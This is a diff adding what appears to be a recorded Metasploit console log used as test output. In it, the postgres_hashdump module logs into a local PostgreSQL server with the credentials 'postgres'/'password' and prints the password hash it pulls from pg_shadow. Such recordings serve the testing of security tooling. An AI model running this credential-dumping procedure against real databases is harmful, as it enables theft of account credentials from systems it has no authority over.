@@ -1,0 +1,32 @@
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 43 modules:
+    14 auxiliary modules
+    13 exploit modules
+    16 post modules
+[4mmsf6[0m [0m> features set postgresql_session_type true
+postgresql_session_type => true
+[!] Run the save command and restart the console for this feature to take effect.
+[4mmsf6[0m [0m> use auxiliary/scanner/postgres/postgres_hashdump
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> run lhost=127.0.0.1 username=postgres password=password rhost=127.0.0.1 rport=5432 Verbose=true
+[+] 127.0.0.1:5432 Postgres - Logged in to 'postgres' with 'postgres':'password'
+[*] 127.0.0.1:5432 Postgres - querying with 'SELECT usename, passwd FROM pg_shadow'
+[!] No active DB -- Credential data will not be saved!
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username  Hash
+ --------  ----
+ postgres  SCRAM-SHA-256$4096:wXsrRtIeV+XqXMuMwR1XUA==$z/N3HoHzhwdarL/799t50S6yx5qmrpXPPjNUFpBwLIQ=:DcXxcuU0n3r0J4nYrV3vqLXmzYtYIxiUXtmLOaDmBG4=
+
+[*] 127.0.0.1:5432 Postgres - Disconnected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[4mmsf6[0m auxiliary([1m[31mscanner/postgres/postgres_hashdump[0m) [0m> 
